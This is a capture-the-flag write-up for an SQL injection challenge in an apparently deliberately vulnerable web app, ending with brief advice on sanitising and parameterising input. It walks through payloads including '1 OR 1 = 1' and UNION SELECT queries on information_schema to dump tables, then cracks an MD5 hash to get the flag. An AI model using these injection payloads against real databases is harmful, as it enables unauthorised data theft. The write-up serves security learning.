# [SQL_Injection](https://owasp.org/www-community/attacks/SQL_Injection)

## WriteUp
On route `index.php?page=searchimg`, there is a prompt that allows us to search for an image within the database by specifying it's ID. Entering a number 1,2,3 and 5 displays thetitle and a url of the image.

Checking for Sql injections, we can pass the prompt `1 OR 1 = 1`. This causes all images to be displayed, meaning we can preform SQL Injections on the database. To gather data on the all the tables within the database and their columns, let use the prompt `1 OR 1 = 1 UNION SELECT table_name,column_name FROM information_schema.columns`.

This causes the webapp to render out all tables within the database and their colums, here is a simplified view:
``` ts
db = {
	"db_default": {
		"id": number,
		"username": string,
		"password": string,
	},
	"users": { // members
		"user_id": number,
		"first_name": string,
		"last_name": string,
		"town": string,
		"country": string,
		"planet": string,
		"Commentaire": string, 
		"coubtersign": string, // md5 hash
	},
	"guestbook": { //
		"id_comment": number,
		"comment": string,
		"name": string,
	},
	"list_images": { // Images
		"id": number,
		"url": string,
		"title": string,
		"comment": string,
	},
	"vote_dbs": {
		"vote": any, // I have no idea
		"nb_vote": number,
		"subject": string,
	},
}
```

Using `1 UNION SELECT title,%colunm% FROM list_images`, where `%column%` is a column in `list_images`, we can leak all the colunms for each image in `list_images`. We get the folowing image that looks interesting:
``` json
{
  "images": { 
    "id": 5,
	"url": "Hack me ?",
	"Commentaire": "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46",
  },
}
```

Decripting the password with an [MD5 decryptor](https://md5decrypt.net/en/#answer), we get the password `albatroz`, getting the Sha256 of `albatroz` nets us the flag.

## Possible Patches
Sanitizing your input and parameterizing your input is the best way to prevent sql injections. By removing/encoding dangerous characters you can prevent injections from happening.